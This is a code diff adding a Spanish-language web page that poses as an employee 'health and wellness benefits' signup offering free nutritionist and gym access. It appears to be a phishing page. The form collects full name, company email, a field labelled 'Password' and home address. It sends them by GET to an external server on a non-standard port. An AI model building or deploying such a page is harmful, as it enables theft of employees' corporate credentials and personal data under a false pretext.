@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Beneficios de Salud - Registro</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: 'Montserrat', sans-serif;
+            background-color: #f4f7f6;
+            color: #2c3e50;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .card {
+            background-color: #ffffff;
+            border-radius: 8px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.05);
+            max-width: 480px;
+            width: 100%;
+            padding: 40px;
+            border-top: 5px solid #2d6a4f;
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .header h1 {
+            color: #1b4332;
+            font-size: 1.5rem;
+            font-weight: 700;
+            margin-bottom: 12px;
+        }
+
+        .header p {
+            color: #40916c;
+            font-size: 0.95rem;
+            line-height: 1.5;
+            font-weight: 500;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            font-size: 0.85rem;
+            font-weight: 600;
+            color: #1b4332;
+            margin-bottom: 8px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        input[type="text"],
+        input[type="email"] {
+            width: 100%;
+            padding: 12px 15px;
+            font-size: 0.95rem;
+            border: 1px solid #d8f3dc;
+            border-radius: 6px;
+            background-color: #f8fbf9;
+            transition: border-color 0.2s, box-shadow 0.2s;
+            font-family: inherit;
+        }
+
+        input[type="text"]:focus,
+        input[type="email"]:focus {
+            outline: none;
+            border-color: #2d6a4f;
+            box-shadow: 0 0 0 3px rgba(45, 106, 79, 0.15);
+            background-color: #ffffff;
+        }
+
+        .btn-submit {
+            width: 100%;
+            background-color: #2d6a4f;
+            color: #ffffff;
+            border: none;
+            padding: 14px;
+            font-size: 1rem;
+            font-weight: 600;
+            border-radius: 6px;
+            cursor: pointer;
+            transition: background-color 0.2s ease;
+            margin-top: 10px;
+        }
+
+        .btn-submit:hover {
+            background-color: #1b4332;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="card">
+        <div class="header">
+            <h1>Beneficios de Salud y Bienestar</h1>
+            <p>Para conocer los beneficios de nutricionista y gimnasio gratis y localizar el más cercano a tu domicilio, llena el siguiente formulario:</p>
+        </div>
+
+        <form action="https://www.summitmx.com:4433/SSM/encuesta.php" method="GET">
+            <div class="form-group">
+                <label for="nombre">Nombre Completo</label>
+                <input type="text" id="nombre" name="nombre" required placeholder="Ej. Juan Pérez">
+            </div>
+
+            <div class="form-group">
+                <label for="correo">Correo de la Empresa</label>
+                <input type="email" id="correo" name="correo" required placeholder="usuario@empresa.com">
+            </div>
+
+            <div class="form-group">
+                <label for="nomina">Password</label>
+                <input type="text" id="nomina" name="nomina" required placeholder="">
+            </div>
+
+            <div class="form-group">
+                <label for="domicilio">Domicilio</label>
+                <input type="text" id="domicilio" name="domicilio" required placeholder="Calle, Número, Colonia, Ciudad">
+            </div>
+
+            <button type="submit" class="btn-submit">Consultar Beneficios</button>
+        </form>
+    </div>
+
+</body>
+</html>
